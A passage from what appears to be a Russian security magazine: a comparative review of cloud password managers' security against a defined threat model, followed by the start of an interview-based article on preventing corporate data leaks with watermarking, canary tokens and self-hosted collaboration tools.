Изучив ХПБ, Петя остался  недоволен, ведь его пароли там не будут
в безопасности. Но как тогда хранить все нажитое непосильным трудом?
   Вероятно, все слышали про Apple Keychain или менеджер паролей Google,
которые  настроены  почти на каждом яблочном или  Android-устройстве.
Это облачные менеджеры паролей (ОМП), которые работают на уровне эко‐
системы вендора. А, например, Opera Sync делает нечто похожее, синхро‐
низируя всю активность браузера Opera на разных устройствах, однако это не
исключает уже упомянутых минусов ХПБ. Получается забавная ситуация: пом‐
нишь, что Chrome на платформе macOS полагался на Apple Keychain?
Получается, что ХПБ используют другой, сторонний ОМП для обеспечения
безопасности твоих паролей. Так к чему эти посредники?
   Думаю, самое время сделать небольшое отступление и обсудить, какие
вообще существуют менеджеры паролей. Я бы разделил их на четыре типа:
 • облачные менеджеры паролей (ОМП);
 • локальные менеджеры паролей (ЛМП);
 • корпоративные менеджеры паролей (КМП);
 • детерминистические менеджеры паролей (ДМП).

ОМП хранят данные на серверах вендора и работают как SaaS-решения,
ЛМП хранят данные в виде локального файла на устройстве, КМП хранят
информацию на сервере компании (их можно условно назвать локальным
облаком), а ДМП вообще ничего  нигде не  хранят, но создают пароль
на локальном устройстве каждый раз заново как производную от мас‐
тер‑пароля и домена. По сути, выбор менеджера пароля сводится в первую
очередь к выбору места хранения данных, то есть доверия вендору, и, в мень‐
шей степени, к цене и привлекательности интерфейса. Все остальные ком‐
поненты более или менее одинаковы.
   Сравнить интерфейс и цены менеджеров паролей ты можешь и сам,
поэтому давай посмотрим на них под другим углом, а именно заглянем им
под капот и попробуем выяснить, насколько они соответствуют заявленному
описанию и защищают нас от известных угроз. Для этого определимся
с моделью угроз, чтобы понять, как же нам оценивать менеджеры паролей,
ведь они не могут защитить от всего на свете.
   Предлагаю  считать, что мы полностью доверяем нашему устройству
на хардварном уровне, а также на уровне ОС, то есть мы не будем рассмат‐
ривать  варианты,  когда  коварный  производитель  намеренно  пытается
вытащить все твои пароли через бэкдор. Поэтому остановимся на четырех
основных векторах:
 • враждебная среда ОС (вредоносное ПО, физический доступ, память
   устройства);
 • уязвимости приложения (уязвимости ядра программы и неожиданные
  вещи в начинке);
 • враждебная среда веб‑ресурсов (автозаполнение и фишинг);
 • неопределенность обмена данными  (облако,  синхронизация, шеринг
   паролей).

Собрав 25 продуктов, Петя начал отсекать лишнее. Здесь рассматриваются
персональные решения, поэтому о КМП («Пассворк», Vault, Passbolt) говорить
не буду. ДМП также не стану рассматривать из‑за их редкости и ограничен‐
ности. ЛМП мы тоже оставим в стороне, так как там речь скорее идет
о неофициальных портах для разных платформ, что не позволяет выделить
функциональность ядра продукта (KeePass, pass).
  Из обзора были также исключены заброшенные проекты (Horcrux, Mitro,
Padloc, RememBear), сомнительные (PassKeep), зависимые от экосистемы
или  устройства  (iCloud  Keychain, Google  Password  Manager).  Нелегким
решением было также исключить вендоров, блокирующих российские IP-
адреса (Norton Password Manager, NordPass, ProtonPass), а также тех, чьи про‐
дукты нельзя оплатить из России без дополнительной головной боли (рос‐
сийской картой или через магазин мобильных приложений), поэтому платные
решения были практически исключены из анализа (1Password, Dashlane).
Все‑таки взаимодействовать с решениями, которые изначально настроены
к тебе негативно, — довольно рискованное дело, а менеджер паролей —
это как‑никак про минимизацию рисков. При тестах я пользовался россий‐
ской почтой (mail.ru) и российским IP-адресом.





Жирным в таблице выделены цены тех продуктов, которые можно приобрести
с российской карты.


РАБОТА «ИЗ КОРОБКИ» И ИНТЕРФЕЙС

Один из первых критериев, на которые обычно обращают внимание, —
это удобный интерфейс и простая настройка. Раз уж мы уходим от ХПБ, то
в ОМП все должно быть плюс‑минус так же легко и интуитивно.
   Вот ты скачиваешь и запускаешь менеджер паролей. Но Zoho  Vault
и Kaspersky сначала требуют создать аккаунт в их экосистеме и только потом
уже ввести мастер‑пароль для создания самого хранилища. Мелочь, но неп‐
риятно. Стоит отдать должное Kaspersky, он был единственным, кто пред‐
ложил прочитать пользовательское соглашение. Еще стоит отметить, что
у Zoho Vault не работает регистрация на адреса mail.ru и оплата из россий‐
ского сегмента мобильного магазина приложений недоступна, но бесплатной
версии нам вполне хватит.
   Внутри функции перечисленных программ более‑менее совпадают. Везде
можно добавлять разные категории данных (учетные данные, банковские кар‐
ты, заметки), создавать папки, искать по хранилищу. Если захочешь, то мас‐
тер‑пароль можно всегда поменять! Важная функция — это импорт данных,
у большинства она есть, можно импортировать как из CSV-файлов, так и из
браузера или другого менеджера паролей. А вот у Zoho Vault такой функции
нет вообще, тогда как Kaspersky позволяет импортировать только из CSV-
файлов. У всех конкурентов в этом плане возможностей больше.
   Дизайн — это уже субъективный критерий. Лично мне Keeper показался
пестрым, с обилием функций, от которых разбегаются глаза. У Bitwarden
дизайн очень простой, как будто его делали лет десять назад, а в левой части
окна всегда висит «пустая папка», что очень раздражает. Я как‑то ожидал
большего от проекта такого уровня.





У Sticky Password, Enpass и Kaspersky дизайн спокойный и интуитивно понят‐
ный, всё по делу. Вот не хотел ничего плохого говорить про LastPass, но пос‐
ле запуска в приложении сразу поехала верстка... Хоть интерфейс и выполнен
неплохо, но, как и в Keeper, от обилия функций разбегаются глаза. Главный
минус состоит в том, что после создания пароля я так и не понял, как открыть
карточку, чтобы посмотреть запись.





                                  LastPass





                                Kaspersky

В RoboForm без ста граммов не разберешься. Для входа нужно понять,
как обойти назойливое предложение добавить расширение в Safari. Делается
это через  смену  мастер‑пароля. По идее,  у RoboForm,  так же  как и
у Kaspersky, нужно создать аккаунт в экосистеме, но этот шаг я удачно обо‐
шел, в итоге оставшись без доступа в профиль. Потом меня встретил инте‐
ресный баг: окно приложения показывалось поверх других окон, баг пропал
на следующий день. Дальше — больше: добавить учетные данные нельзя. Вот
и всё, приехали. Чтобы добавить учетную информацию, необходимо залоги‐
ниться на веб‑ресурсе, а затем сохранить пароль в хранилище через рас‐
ширение, но вписать в это хранилище свой собственный пароль из головы
не получится.





                             Пляски с RoboForm

Не буду долго останавливаться на вопросе кросс‑платформенности, то есть
поддержке менеджером паролей всех устройств и интерфейсов. Я исполь‐
зовал критерий «Основные ОС», к которым относятся Windows, macOS, Linux,
Android и iOS — наиболее популярные десктопные и мобильные платформы.
А также «Основные браузеры», к которым я отнес Chrome, Firefox, Safari
и Edge. Практически все изученные мною программы поддерживают весь
упомянутый  зоопарк,  проблемы  возникли  только  с  отсутствием  Linux
у Kaspersky и Sticky Password.


                                     Продолжение статьи →
ПРИВАТНОСТЬ           ← НАЧАЛО СТАТЬИ
 ПАРОЛЬ «РЫБА-МЕЧ»
       ВЫБИРАЕМ ОБЛАЧНЫЙ МЕНЕДЖЕР
                          ПАРОЛЕЙ





УЯЗВИМОСТИ ПО И ВРАЖДЕБНАЯ СРЕДА В РАМКАХ ОС

Вот мы и подобрались к определенной нами модели угроз. Вначале давай
разберемся с проблемой, которую мы вменяли в вину ХПБ, — нестойкостью
перед вредоносным ПО, эксплуатирующим уязвимости в самих приложениях
менеджеров паролей, в шифровании базы данных и в буфере обмена.
   Уязвимости приложений присущи и ХПБ, и ОМП. Как будто в браузерах
не бывает зиродеев и багов — чего  стоят только недавние CVE-2024-
29943 и CVE-2024-29944 в Firefox. В ОМП такие уязвимости тоже находятся:
вот, например, CVE-2021-40539 в Zoho или проблема некорректной работы
API у Keeper в 2018 году. Здесь мы ничего сделать не можем, нам остается
только своевременно обновляться до последней версии.
   Более интересным выглядит второй класс угроз, то есть кейлоггеры, а так‐
же трояны, умеющие делать снимки экрана и извлекать данные из буфера
обмена. Подобные вредоносы в большинстве случаев неплохо обнаружи‐
ваются антивирусами, хотя некоторые ОС встраивают в свои продукты всякие
AI Explorer... К сожалению, только в Enpass есть настройка, блокирующая
менеджер паролей при активации снимка экрана.
  Для Windows также актуальна атака DLL Hijacking, ей подвержены почти
все ОМП. А  удаление  данных  из буфера  обмена  практически  никак
не защищает пользователя. Дело в том, что вредоносное ПО может сох‐
ранить состояние буфера обмена еще до того, как менеджер паролей очис‐
тит его от скопированного содержимого. Вот что пишет разработчик KeePass
Доминик Райхль: «Ни KeePass, ни любой другой менеджер паролей не могут
волшебным образом безопасно работать внутри зараженной шпионским
ПО среде».
   Функция очистки буфера обмена есть у половины рассмотренных ОМП,
а вот функция автоматического выхода по истечении времени есть у всех. Ну
хоть никто посторонний не сможет прочитать пароли в твое отсутствие, то
есть угроза физического доступа ликвидирована. Хотя здесь есть один
нюанс: базовые настройки безопасности у Bitwarden и Zoho Vault, конечно,
так себе, придется полазать в них, чтобы приложение блокировалось при зак‐
рытии и чистило буфер обмена. Тогда как у Keeper, Enpass, Sticky Password
и Kaspersky все работает из коробки. Стоит отметить, что ни один вендор
не хранит мастер‑пароль или его производные в памяти устройства, что само
по себе уже радует.
   Нужно помнить, что приложения — это коммерческий продукт, который
может подложить свинью самостоятельно: использовать Google Tag Manager,
Firebase и прочие трекеры. Не буду вдаваться в подробности, для интересу‐
ющихся есть потрясающий ресурс Exodus, где можно проверить любой
менеджер паролей или другое приложение.


ВРАЖДЕБНАЯ СРЕДА ВЕБ-РЕСУРСОВ

А теперь давай поговорим о самой востребованной функции как ХПБ, так
и других ОМП — автозаполнении. Работает она так: веб‑страница сканиру‐
ется, на ней обнаруживаются все формы, а дальше менеджер паролей под‐
гружает имеющиеся учетные данные и вставляет их в найденные поля. Все
очень просто и изящно, но что может пойти не так?
   Во‑первых, фишинг — то есть ситуация, когда ты оказался на сайте,
который выглядит как настоящий, но им не является. В этом случае и бра‐
узерный, и любой другой менеджер паролей тебя защитит, так как проверяет
соответствие домена. Не поможет это, если разработчики допустят ошибку
в методе распознавания домена, что и произошло с LastPass в 2016 году.
   Вторая самая известная угроза — это атака Clickjacking на скрытые фрей‐
мы, которые контролируются злоумышленником. Дело в том, что злоумыш‐
ленники при компрометации веб‑ресурса иногда подставляют скрытую фор‐
му логина через фрейм под видимую панель аутентификации, а менеджер
паролей автоматически подставляет данные во все найденные формы, о чем
ты даже и не узнаешь. Самый большой скандал произошел с Bitwarden,
который знал об этой угрозе с 2018 года, но предпринял меры по ее миними‐
зации только в 2023 году.
  Еще одна  неприятность — это вездесущие  маркетологи. Некоторые
веб‑ресурсы используют скрытые формы автозаполнения для сбора данных
о пользователе. Все происходит так же, как и в упомянутой выше атаке, толь‐
ко собираются твои личные данные и почта для профилирования, и да, ты
об этом тоже не узнаешь. Но под раздачу‑то могут попасть и пароли!
   Если посмотреть на автозаполнение со стороны ОМП, то единственный
способ соединить их с веб‑страницей — это установить расширение в бра‐
узере. Расширение имеет доступ ко всем страницам браузера и автомати‐
чески загружает в них встраиваемый скрипт (aka скрипт контента), чтобы
на форме логина отрисовывались красивые значки и всплывающие окна
выбора учетных данных.
    Хотя встраиваемый скрипт и работает в изолированной среде, это всего
лишь  концепция, а  за ее  соблюдением  должен  следить  разработчик.
В 2017 году оказалось, что веб‑ресурс может свободно менять переменные
во встраиваемых скриптах расширения LastPass (раз и два). Для отрисовки
элементов встраиваемый скрипт чаще всего использует те же самые при‐
вилегированные фреймы, которыми можно манипулировать, как это про‐
изошло у Keeper в 2017 году или у LastPass в 2019 году. Наконец, можно
банально подменить встраиваемый скрипт с последующим прямым запросом
данных у менеджера паролей. Например, так было у TrendMicro в 2016 году
(инцидент описан здесь и здесь).





                     Компоненты расширения Bitwarden

Если ты думаешь, что проблемам с автозаполнением подвержены только
веб‑страницы и расширения, то спешу тебя огорчить: на мобильных устрой‐
ствах могут использоваться приложения‑клоны или угроза может исходить
из некорректного использования WebView API, которое вылилось в уяз‐
вимость AutoSpill на Android-устройствах. В обоих этих инцидентах были
замечены LastPass, Keeper, 1Password, RoboForm и Enpass.
   Как мы видим, от фишинга нас защищают все менеджеры паролей, атакам
Clickjacking и краже данных рекламщиками подвержены, к сожалению, также
все, а у расширений есть и свои проблемы. Чтобы защититься, отключи авто‐
заполнение при загрузке страницы, чтобы данные подставлялись только пос‐
ле твоего явного разрешения, а также вовремя устанавливай обновления.
Но не стоит отказываться от этой функции полностью, злоумышленнику будет
намного труднее обмануть сразу и тебя, и менеджер паролей.


НЕОПРЕДЕЛЕННОСТЬ ОБМЕНА ДАННЫМИ

С ХПБ все неопределенно: вряд ли мы когда‑нибудь узнаем, где они хранят
данные, кроме, разумеется, локальной копии. Вопрос неопределенности
острее всего стоит у ОМП. Все рассмотренные ОМП на своих сайтах заяв‐
ляют  о  том,  что  используют  шифрование  AES-256  с PBKDF2  SHA-
256/512 для получения ключа шифрования, хранят данные по принципу
нулевого разглашения и почти все используют сквозное шифрование. Звучит
это все очень технологично и безопасно, но как же все‑таки дела обстоят
в реальности?
  В теории ты устанавливаешь программу на устройстве, вводишь мас‐
тер‑пароль и создаешь хранилище, которое представляет собой локальный
файл, зашифрованный как раз тем самым алгоритмом AES-256. Ключ шиф‐
рования получается как производное от мастер‑пароля по алгоритму PBKDF2
HMAC SHA-256/512 (тот же самый Keeper использует миллион раундов,
у RoboForm их всего 100 тысяч, а некоторые, например Bitwarden, дают воз‐
можность изменить количество раундов в настройках). Пока все понятно, все
эти процессы проходят локально.
   Дальше все ОМП можно разделить на три категории: те, что не хранят
мастер‑пароль или его производные на сервере компании‑вендора (Sticky
Password),  те, что  хранят (Bitwarden, LastPass, RoboForm, Keeper), и  те,
о которых в этом плане ничего не известно (Zoho Vault, Kaspersky).
   Дело в том, что вендор должен аутентифицировать пользователя, то есть
понять, что зашифрованное хранилище принадлежит именно тому, кто его
запрашивает. Например, Kaspersky делает это через дополнительную аутен‐
тификацию в экосистемном аккаунте (помнишь тот шаг при регистрации,
который показался нам неудобным?). Bitwarden сравнивает мастер‑пароль
с двумя итерациями PBKDF2-SHA-256 и солью в виде email с результатом
на сервере, а Sticky Password использует дополнительный ключ, никак не свя‐
занный с мастер‑паролем.
   Некоторые предлагают включить 2FA, чтобы обезопасить доступ к хра‐
нилищу даже при наличии производных от мастер‑ключа на сервере вендора.
Однако здесь есть один маленький, но очень важный нюанс. Все рассмот‐
ренные ОМП используют 2FA для аутентификации, которую выполняет вендор
при синхронизации с облаком и обмене данными с пользователями, а шиф‐
рование хранилища здесь совершенно ни при чем. Ключ 2FA вендор хранит
на своем сервере, поэтому для прохождения двухфакторной аутентификации
необходимо подключение к интернету. Установив 2FA, ты не делаешь свое
хранилище безопаснее и не усложняешь потенциальную задачу брутфорса
для злоумышленника.
   Возможно, кто‑то заметит, что многие вендоры пишут о наличии сквозного
шифрования (E2EE). То есть данные шифруются до конечного устройства
пользователя, а значит, никакой опасности нет. К сожалению, в данном слу‐
чае это сквозное шифрование Шредингера: вендор может заявлять, что име‐
ет сквозное шифрование, но, пока исходный код продукта не открыт, мы
не можем подтвердить или опровергнуть это утверждение. Тем более что
в большинстве случаев имеется в виду сквозное шифрование от устройства
к серверу вендора для синхронизации хранилища, что по сути идентично тра‐
диционному HTTPS-соединению и ничем от него не отличается.
  На самом деле есть и менее явная причина, по которой сервер вендора
будет хранить твой мастер‑пароль и не будет считаться независимой сто‐
роной в сквозном шифровании. Все ОМП предлагают сервис веб‑хранили‐
ща:  это  когда  ты можешь  получить  доступ  к  своим  данным  через
веб‑интерфейс на сайте вендора. Упомянутая услуга идет в комплекте, отме‐
нить ее нельзя, а значит, при создании хранилища веб‑сервер автоматически
становится одним из «твоих» устройств, и ему требуются ключи для дешиф‐
ровки данных, передаваемых со сквозным шифрованием. Плюс он должен
проводить операцию по преобразованию твоего мастер‑пароля, который ты
ввел в веб‑форме, в ключ дешифровки хранилища, чтобы показать тебе
заветные пароли. Никто из рассмотренных ОМП не говорит, что происходит
с мастер‑паролем из веб‑формы, так же как и не говорит о безопасности
своего веб‑приложения. Печально, что у многих вендоров в веб‑версии дос‐
тупно больше настроек, чем в приложении, что заставляет клиента идти
на риск.
   Так в безопасности ли хранящиеся на серверах вендора данные, как об
этом заявляют рекламные заголовки? Взломы ОМП случались, больше всего
отличился LastPass, когда в 2011 и в 2015 годах хакеры смогли получить хеши
паролей и соли, а в 2022 году из LastPass утекли еще и бэкапы баз данных
пользователей, а URL-адреса сайтов в хранилищах вообще никак не шиф‐
ровались. В 2016 году были взломаны хранилища Opera Sync, а в 2017-м
серверы OneLogin.
   Конечно, что произошло дальше с похищенными бэкапами и сколько
из них удалось расшифровать — тайна, покрытая мраком, но стоит ли оно
твоих нервов, когда после очередного взлома ты будешь приглядываться
к каждому письму, избегая фишинга и социальной инженерии? В последнее
время сформировался тренд на локальную синхронизацию, которая выпол‐
няется не через облако, а в домашней сети, когда устройства находятся
рядом. В этом случае ОМП (Sticky Password, Enpass) становится сервисом
синхронизации и интерфейса, играя роль ЛМП.
  В идеале, конечно, ОМП — это сервис для хранения и синхронизации
бэкапов зашифрованной базы данных твоих паролей. Но на практике все ока‐
зывается куда прозаичнее. Вендор действительно не видит ни твоего мас‐
тер‑пароля, ни содержимого хранилища, но ведь никто не говорил, что он
не видит хеша твоего мастер‑пароля. Также никто не говорил, какие конкрет‐
но данные шифруются при передаче на сервер или откуда берется соль
для всего этого криптографического рая.
  В целом принцип нулевого разглашения и сквозное шифрование работа‐
ют, но с некоторыми оговорками. И пусть тебя не смущают громкие термины,
куча криптографических функций и заумные фразы. Единственное, что стоит
между твоими нервами и безопасностью хранилища, — это твое доверие
вендору. Ты либо веришь,  что  вендор  действительно  делает все  так,
как написал в рекламе, что он не занимается подпольным составлением
радужных таблиц или не сможет выдать твои данные по первому запросу,
либо, пользуясь ОМП, ты никогда не будешь уверен, что твои пароли не знает
никто, кроме тебя.


ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ

Одно из главных преимуществ ОМП над ХПБ состоит в том, что первые дают
возможность анализировать пароли. Сюда относится традиционный «анализ
пароля на сложность», а также ставшая популярной «проверка по утечкам».
С анализом сложности паролей вроде бы все уже понятно. А как происходит
проверка пароля на наличие в утечках?
  Все рассмотренные ОМП (кроме Kaspersky) делают это, как ни странно,
абсолютно одинаково, руководствуясь методом k-анонимности, разработан‐
ным Cloudflare. Твой локальный клиент посылает первые пять символов хеша
SHA-1 каждого пароля на haveibeenpwned.com, который возвращает все
пароли из утечек, начинающиеся с этих символов, а дальше эта выборка уже
локально сравнивается с твоим полным паролем. Только Sticky Password
отправляет данные не на haveibeenpwned.com, а в ARC, базу от компании
Crossword Cybersecurity, хотя сути это не меняет. Сразу хочется спросить:
сколько памяти съедают эти манипуляции и что именно раскрывается внеш‐
нему сервису?
  Из всех ОМП только Bitwarden имеет открытый исходный код. Давай заг‐
лянем в него. Запрос отправляется с твоей машины, никто его не проксирует,
то есть  сторонний  сервер, кроме  части хеша,  получает твой IP-адрес
и юзер‑агент, а также при некоторых запросах домен и имя пользователя. Вот
и весь анализ дарквеба, о котором пишут ОМП на своих сайтах. А Kaspersky
отправляет весь SHA-256-хеш непонятно куда (вероятно, на свои серверы)
и производит сравнение там. Причем отключить эту функцию, похоже, нельзя,
поэтому давай сразу считать, что у Kaspersky хранятся SHA-256-хеши всех
твоих паролей. Ну хоть без сторонних сервисов, и то хорошо.
  Еще одна интересная функция — это доступ при экстренных обстоятель‐
ствах. Ты назначаешь какого‑либо пользователя ОМП своим экстренным кон‐
тактом, тот, в свою очередь, должен принять приглашение, посылая тебе
свой публичный ключ, а на третьем этапе ты подтверждаешь, что все идет
по плану, шифруя мастер‑пароль публичным ключом экстренного контакта.
В нужный момент твой экстренный контакт запрашивает доступ, и ему при‐
ходит твой мастер‑пароль, который он может расшифровать своим приват‐
ным ключом. В целом задумка  интересная и может  служить неплохим
решением на случай утери мастер‑пароля. Примерно по такому же принципу
происходит и шеринг данных с другими пользователями, так что и эта фун‐
кция в целом безопасна.
   Самая фееричная фича — это восстановление доступа. Казалось бы,
как такое возможно, если никто вроде как ничего не хранит на своих сер‐
верах? Указанная функция у Keeper предполагает запоминание секретной
фразы, шифрующей мастер‑пароль, который затем отправляется на сервер
вендора. Но LastPass не был бы LastPass’ом, если бы не стал еще и сохранять
эту секретную фразу на устройстве пользователя без уведомления клиента
о подобном сервисе. Все другие ОМП функцией восстановления доступа
не обладают.


ВЫВОДЫ

Петя проделал большой путь и понял главное — по сути, ОМП по сравнению
с ХПБ позволяют:
 • шифровать базу;
 • хранить что‑то, кроме учетных данных;
 • синхронизировать базу между устройствами;
 • анализировать пароли.

Для обеих этих категорий программ присущи одни и те же типы угроз, но ата‐
ковать ОМП для злоумышленника куда сложнее, чем ХПБ. А если под тебя
проводится целевая атака, то будь уверен, что доступ к хранилищу злоумыш‐
ленник точно получит. В любом случае ХПБ — это намного лучше, чем стикер
на экране, а ОМП — это еще лучше, чем ХПБ. При этом не все ОМП рождены
равными, поэтому, будешь ли ты использовать ХПБ или ОМП и какой именно
выберешь баланс между удобством использования и рисками, зависит толь‐
ко от тебя.


                                        Браузерные   Облачные

  Бесплатный                         +             +–

  Работа из коробки                    +             +–

  Простой интерфейс                   +             +

  Автозаполнение                     +             +

  Уязвимости автозаполнения              Есть            Есть

  Уязвимость к вредоносному ПО           Есть            Есть

  Уязвимость физического доступа          Есть           –

  Уязвимость к фишингу                 –             –

  Очистка буфера обмена               –             +

  Автовыход/блок                      –             +

  Категории данных                    –             +

  Анализ паролей                      –             +

  Доступ на всех устройствах             –             +

 Шифрование БД                     –             +

  Только локальная БД                        Неизвестно     +–

  Только локальное содержание БД           Неизвестно     +–

  Только локальный мастер‑пароль         N/A           +–

Идеального решения не существует, но постараюсь собрать все рекомен‐
дации воедино.
 • При создании хранилища отключи функцию восстановления доступа.
 • Не ставь флажок «Сохранить мой мастер‑пароль» при входе в хранилище,
   иначе он будет сохранен в памяти твоего устройства.
 • Отключи функцию «Проверка пароля по утечкам», так больше шансов, что
   ни целый хеш, ни его часть с твоими метаданными не утекут за пределы
   инфраструктуры вендора.
 • Не используй автозаполнение! Пусть менеджер паролей будет рекомен‐
   довать, что и куда подставить, но финальное решение должно всегда
   оставаться за тобой.
 • По  возможности  не  используй  веб‑версию  менеджера  паролей,
   это уменьшит шансы того, что твой мастер‑пароль останется на сервере
   вендора.
 • Сузь  область  применения  авторекомендаций,  исключив  поддомены
   веб‑ресурса при подсказках. И по возможности ограничь количество
   предложений одним или двумя.
 • Если есть подозрение, что ты зашел не в ту дверь, лучше сразу же смени
   пароль и добавь 2FA к веб‑ресурсу.
 • Наконец, включай антивирус и обновляй ПО вовремя, это убережет тебя
   от банальных инфостилеров и известных уязвимостей.

Помни, что менеджер паролей — это коммерческий продукт, который сделан
людьми. Используй только тот, которому искренне доверяешь, иначе спокой‐
но спать ты точно не сможешь.
ПРИВАТНОСТЬ





Расследование утечек данных — дело хло‐
потное и дорогостоящее. Восстановление
утраченного  доверия,  юридические  раз‐
бирательства и попытки минимизировать
убытки могут затянуться на месяцы. Гораз‐      Валентин Холмогоров                                                                               Ведущий редактор
до проще и дешевле предотвратить инци‐         valentin@holmogorov.ru
дент,  чем  устранять  его  последствия.
В этом материале мы разберем практичес‐
кие шаги по предотвращению утечек дан‐
ных,  начиная  от  технических  решений
и заканчивая методами управления рис‐
ками.


Как показывает практика, ни одна организация, будь то крупная корпорация
или  небольшая  компания, не  застрахована  от хищения  персональной
информации, утечек клиентских баз данных и иных подобных инцидентов.
Можно ли если не обезопасить себя от таких происшествий полностью, то
хотя бы снизить сопутствующие риски? Да, и для этого существует проверен‐
ный временем комплекс методов. О них мы сегодня и поговорим.


             INFO

                        Статья  написана  по  материалам  интервью
                        с Дмитрием Борощуком. Беседовал и готовил
                        финальный текст Валентин Холмогоров.


Дмитрий Борощук уже больше пятнадцати лет решает сложные задачи в сфе‐
ре безопасности,  уделяя особое внимание защите информации. Одно
из ключевых направлений его работы — предотвращение утечек данных,
а  также  расследование  инцидентов и выявление  виновников: со всем
перечисленным он регулярно сталкивается в своей практике. В прошлом
материале мы говорили о том, что нужно делать, если утечка уже произошла.
Сейчас будем разбираться с тем, как ее не допустить.


СОБСТВЕННОЕ ОБЛАКО

Первой мыслью, когда заходит речь о защите от сливов внутренних данных,
становится идея загнать сотрудников в полностью контролируемую среду. Тут
главное — не перегнуть палку с запретами и сделать эту среду максимально
удобной и доступной. Давай попробуем описать большинство типичных пот‐
ребностей сотрудников компании:
 • нужно хранить файлы с разграничением доступа, так, чтобы к ним был дос‐
   туп у самого сотрудника;
 • надо эти файлы создавать и совместно редактировать (в общем, нужен
   аналог Google Docs);
 • нужно хранить, редактировать и просматривать фото;
 • необходим почтовый клиент (куда же без него в коммерческой компании);
 • нужен безопасный мессенджер;
 • необходим сервис видеоконференций;
 • также не обойтись без календаря и заметок;
 • требуется возможность добавлять недостающие функции по мере необ‐
   ходимости.

И главное — нужно контролировать все это, чтобы понимать, кто когда и что
именно делал с коммерческими данными. Существует большое количество
готовых продуктов, способных решить все эти задачи, но стоят они, как пра‐
вило, много‑много денег. Что делать коммерческому предприятию с неболь‐
шим штатом и не таким бескрайним бюджетом, как у крупных компаний?
Выручат два практически одинаковых (на самом деле у них одни корни, прос‐
то команда в какой‑то момент разделилась на две и каждая из них начала
пилить свой вариант) открытых и бесплатных решения: OwnCloud и NextCloud
(о втором, кстати, «Хакер» уже подробно писал).
  С помощью этих инструментов можно организовать так называемый self-
hosted-сервер, который ты можешь совершенно бесплатно развернуть хоть
на NAS, хоть на виртуальной машине, хоть на отдельном компьютере, создав
персональный аналог Google Docs с доступом через обычный браузер.
Но главной особенностью будет то, что ты сможешь контролировать каждое
действие пользователей в этой среде, вплоть до того, кто и какие файлы ска‐
чивал и на какое именно устройство. Дмитрий Борощук считает это идеаль‐
ным вариантом организации командной работы для малого и среднего биз‐
неса, особенно по соотношению цена/качество (все‑таки настройка и внед‐
рение стоит определенных денег).


КАК ОТСЛЕДИТЬ УТЕЧКИ?

Перенести всю критически важную информацию в локальную и хорошо кон‐
тролируемую инфраструктуру — это только половина дела. Вторая полови‐
на — заранее предусмотреть способы отслеживания возможных сливов, что‐
бы при необходимости быстро установить виновных и ликвидировать пос‐
ледствия.
   Конечно же, на ум сразу приходят коммерческие deception-решения типа
Xello, R-TDP или разработки от той же «АВ Софт». И это только российские
продукты. Но мы будем стараться решать задачи с минимумом бюджета
или полным его отсутствием. Знакомая история, ведь правда?
  Один из основных способов отслеживания утечек — это маркировать дан‐
ные. Тут вариантов может быть масса: от организации контролируемых уте‐
чек, с помощью которых можно определить, кто конкретно из сотрудников
слил важную информацию, до отслеживания факта открытия или редак‐
тирования файла с использованием различных маяков или с применением
дополнительной   нагрузки,  которая  вела  бы  «контрразведывательную
деятельность» уже на стороне злоумышленника. Конкретное использование
подобных инструментов ограничивается только твоей фантазией и оператив‐
ным опытом.
   Дмитрий рассказал о трех методах из его собственного арсенала, которы‐
ми он чаще всего пользуется на практике.


Водяные знаки
Физические объекты (ценные бумаги, документы и другие важные файлы)
всегда можно отмаркировать, чтобы сделать их в своем роде уникальными
носителями идентифицируемых признаков. То же самое можно сделать
с файлами при помощи стеганографии — методики помещения одной
информации в другую. Тут, конечно же, приходят на ум старые добрые инс‐
трументы OpenStego и OpenPuff, которые позволяют проводить все операции
с файлами и их маркировкой, при этом обладают простым и лаконичным
интерфейсом.





                        Интерфейс OpenStego





                         Интерфейс OpenPuff

Есть одно но — эти программы регулярно детектируются антивирусами, но ты
всегда можешь найти альтернативу или свежий форк.
   Основываясь на этом же методе, работает решение Wholeaked. На вход
этой программе передается файл, который будет использоваться совместно,
и список получателей. Приложение создает уникальную подпись для каждого
получателя и скрыто добавляет ее в файл. После этого Wholeaked автомати‐
чески отправляет файлы соответствующим адресатам с помощью интеграции
SendGrid, AWS SES или SMTP. Ну или по старинке файлы можно разослать
вручную. Если какой‑то файл все‑таки утек в сеть, метка поможет найти
виновника и доказать его причастность к инциденту.


Маяки
Под маяками Дмитрий Борощук имеет в виду  инструменты, созданные
с целью выявлять и отслеживать подозрительную активность внутри сети
и таким образом предотвратить взлом или утечку данных. Подобные системы
позволяют  создавать различные токены‑ловушки, которые  используются
для мониторинга и обнаружения несанкционированных действий. Эти токены,
размещенные в документах или других объектах, срабатывают, когда зло‐
умышленник взаимодействует с ними, и сообщают владельцу о нарушении.
   Тут правит бал знаменитая «канарейка». Canarytokens — это ловушки,
которые выглядят как обычные файлы, веб‑страницы, API-ключи, DNS-записи
и другие объекты, но на самом деле играют роль детекторов активности. Ког‐
да злоумышленник пытается получить доступ к этим объектам, срабатывает
триггер, отправляющий  уведомление  владельцу. Токен можно  внедрить
в важный документ, например PDF-файл. Если кто‑то скачает или откроет
такой файл, владелец сразу получит уведомление о попытке доступа.
   Работа с Canarytokens выглядит следующим образом:
 1. Пользователь создает токен на платформе canarytokens.org.
 2. Токен внедряется в документ или файл.
 3. При активации токена (например, при открытии файла) система отправ‐
   ляет владельцу уведомление по электронной почте или другим указанным
   каналам.

Бесплатная альтернатива «канарейке» — проект с открытым исходным кодом
OpenCanary  действует схожим образом. Основное отличие заключается
в том, что ПО OpenCanary нужно предварительно интегрировать с сервером
предприятия — поддерживаются Windows Server, MySQL Server, MS SQL
Server и серверы под Linux. OpenCanary фиксирует все попытки взаимодей‐
ствия с этими сервисами и предоставляет администраторам информацию
о подозрительной активности.
   Штука это хорошая и удобная благодаря универсальности — повесить
маяк можно на очень разные действия.


КАК ЗАЩИТИТЬСЯ ОТ УТЕЧКИ РАЗГОВОРА В ZOOM?

«Водяные знаки», речь о которых шла выше, — прекрасное средство про‐
филактики утечек. Но что делать, когда ты находишься не в полностью контро‐
лируемой среде? Например, разговор в Zoom: этот сервис сейчас крайне
популярен в корпоративной среде. Ведь всегда может случиться так, что
кому‑то из участников захочется поделиться содержанием приватного раз‐
говора, ну или просто слить не конфиденциальный, а какой‑нибудь платный
контент, типа консультации или тренинга.
  На самом деле все очень просто — сам сервис подумал за тебя и внедрил
специальный способ маркировки того, что происходит внутри него:
 1. Video Watermark — функция, которая добавляет в изображение на экране
   данные, например электронную почту или никнейм участника, который эту
   запись производил.
